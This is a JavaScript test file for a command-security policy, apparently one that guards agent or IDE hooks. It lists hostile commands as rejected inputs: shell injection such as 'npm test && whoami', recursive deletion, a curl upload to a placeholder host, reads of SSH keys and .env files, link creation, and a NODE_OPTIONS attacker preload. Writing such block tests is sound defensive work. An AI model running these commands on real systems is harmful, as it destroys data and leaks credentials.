import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs/promises";
import path from "node:path";
import { classifyHookCommand, tokenizeCommand, validateVerificationCommand } from "../src/security/command-policy.js";
import { RepeatCommandCircuitBreaker } from "../src/security/circuit-breaker.js";
import { buildVerificationEnvironment, runVerificationCommand } from "../src/verification.js";
import { temporaryWorkspace } from "./helpers.js";

test("verification policy accepts only recognized non-shell test/lint/build commands", () => {
  assert.equal(validateVerificationCommand("npm test").executable, "npm");
  assert.equal(validateVerificationCommand("npm run lint -- --fix=false").args[1], "lint");
  assert.equal(validateVerificationCommand("node --test test/unit.test.js").args[0], "--test");
  assert.deepEqual(tokenizeCommand('npm run test -- --test-name-pattern "works well"'), ["npm", "run", "test", "--", "--test-name-pattern", "works well"]);
  assert.deepEqual(tokenizeCommand('node --test "C:\\tmp\\foo.test.js"'), ["node", "--test", "C:\\tmp\\foo.test.js"]);
});

test("verification policy rejects command injection and unapproved scripts", () => {
  for (const command of [
    "npm test && whoami",
    "npm test > output.txt",
    "npm test; Remove-Item -Recurse .",
    "npm run deploy",
    "powershell -Command npm test",
    "./node --test"
  ]) {
    assert.throws(() => validateVerificationCommand(command), undefined, command);
  }
});

test("hook policy blocks destructive, exfiltration, and link-creation commands", () => {
  assert.equal(classifyHookCommand("rm -rf build").allowed, false);
  assert.equal(classifyHookCommand("curl https://example.test/upload").allowed, false);
  assert.equal(classifyHookCommand("curl.exe https://example.test/upload").allowed, false);
  assert.equal(classifyHookCommand("rm.exe -rf build").allowed, false);
  assert.equal(classifyHookCommand("ln -s ../outside linked").allowed, false);
  assert.equal(classifyHookCommand("node -e \"console.log('x')\"").allowed, false);
  assert.equal(classifyHookCommand("node --eval=console.log(1)").allowed, false);
  assert.equal(classifyHookCommand("python -c \"print('x')\"").allowed, false);
  assert.equal(classifyHookCommand("npx eslint .").allowed, false);
  assert.equal(classifyHookCommand("npm exec eslint .").allowed, false);
  assert.equal(classifyHookCommand("pnpm dlx eslint .").allowed, false);
  assert.equal(classifyHookCommand("npm install left-pad").allowed, false);
  assert.equal(classifyHookCommand("git config --global user.name x").allowed, false);
  assert.equal(classifyHookCommand("Get-Content ~/.ssh/id_rsa").allowed, false);
  assert.equal(classifyHookCommand("Get-Content .env").allowed, false);
  assert.equal(classifyHookCommand("git apply patch.diff").allowed, false);
  assert.equal(classifyHookCommand("python script.py").allowed, false);
  assert.equal(classifyHookCommand("npm test").allowed, false);
  assert.equal(classifyHookCommand("fsutil hardlink create inside.txt outside.txt").allowed, false);
  assert.equal(classifyHookCommand("Get-Content .windsurf/hooks.json").allowed, false);
  assert.equal(classifyHookCommand("git status --short").allowed, true);
  assert.equal(classifyHookCommand("rg TODO src").allowed, true);
  assert.equal(classifyHookCommand("rg --hidden token .").allowed, false);
});

test("repeat-command circuit breaker blocks after two attempts per execution", () => {
  const breaker = new RepeatCommandCircuitBreaker(2);
  assert.equal(breaker.check("run-1", " npm   test ").allowed, true);
  assert.equal(breaker.check("run-1", "npm test").allowed, true);
  assert.equal(breaker.check("run-1", "npm test").allowed, false);
  assert.equal(breaker.check("run-2", "npm test").allowed, true);
});

test("verification timeout terminates the spawned test process tree", { timeout: 10_000 }, async (t) => {
  const root = await temporaryWorkspace(t);
  await fs.writeFile(path.join(root, "slow.test.js"), [
    'import test from "node:test";',
    'test("slow", async () => new Promise((resolve) => setTimeout(resolve, 30_000)));',
    ""
  ].join("\n"));
  const result = await runVerificationCommand({ command: "node --test slow.test.js", cwd: root, timeoutMs: 1_000 });
  assert.equal(result.timedOut, true, result.stderr || result.stdout);
  assert.equal(result.passed, false);
  assert.ok(result.durationMs < 8_000, `termination took ${result.durationMs}ms`);
});

test("verification subprocesses receive only explicit non-secret runtime environment", () => {
  const environment = buildVerificationEnvironment({
    Path: "C:\\runtime\\bin",
    SystemRoot: "C:\\Windows",
    TEMP: "C:\\Temp",
    HOME: "C:\\Users\\fixture",
    JAVA_HOME: "C:\\Java",
    LANG: "en_US.UTF-8",
    NODE_OPTIONS: "--require ./attacker.js",
    GITHUB_TOKEN: "must-not-pass",
    AWS_SECRET_ACCESS_KEY: "must-not-pass",
    HTTPS_PROXY: "https://user:password@example.invalid"
  });
  assert.deepEqual(environment, {
    Path: "C:\\runtime\\bin",
    SystemRoot: "C:\\Windows",
    TEMP: "C:\\Temp",
    HOME: "C:\\Users\\fixture",
    JAVA_HOME: "C:\\Java",
    LANG: "en_US.UTF-8"
  });
});
